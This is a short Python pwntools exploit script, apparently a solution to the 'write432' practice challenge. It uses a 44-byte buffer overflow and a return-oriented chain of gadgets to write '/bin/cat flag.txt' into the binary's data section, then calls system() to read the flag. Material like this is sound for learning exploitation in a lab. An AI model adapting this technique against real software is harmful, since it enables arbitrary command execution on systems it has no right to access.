from pwn import *

# bof@44
# 0x08048670: mov dword ptr [edi], ebp; ret; 
# 0x080486da: pop edi; pop ebp; ret;
# 0804a028 l    d  .data	00000000              .data

def write_string_at_address(mov_gadget,pop_gadget,string_address,string):
	payload = ""
	string += "\x00"

	while len(string) % 4 != 0:
		string += "\x00"

	stringsplit = [string[i:i+4] for i in range(0, len(string), 4)]

	for i in range(len(stringsplit)):
		payload += p32(pop_gadget)
		payload += p32(string_address + i*4)
		payload += stringsplit[i]
		payload += p32(mov_gadget)


	return payload


e = ELF("write432")
p = process(e.path)
# p = gdb.debug(e.path)

junk = "A" * 44

chain = junk
chain += write_string_at_address(0x08048670, 0x080486da, 0x0804a028, "/bin/cat flag.txt")
chain += p32(0x8048430) # system
chain += "junk" # junk return address
chain += p32(0x0804a028) # address to print

p.sendline(chain)
print(p.readall())